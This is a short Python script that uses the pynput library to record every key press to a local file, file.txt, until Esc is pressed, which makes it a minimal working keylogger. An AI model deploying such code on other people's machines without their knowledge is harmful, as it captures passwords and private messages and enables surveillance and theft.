from pynput import keyboard

def on_press(key):
        try:
            with open("./file.txt", "a", encoding="UTF-8") as output_file:
                if key == keyboard.Key.space:
                    output_file.write(" ")
                else:
                    output_file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.esc:
                # Stop listener
                return False

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()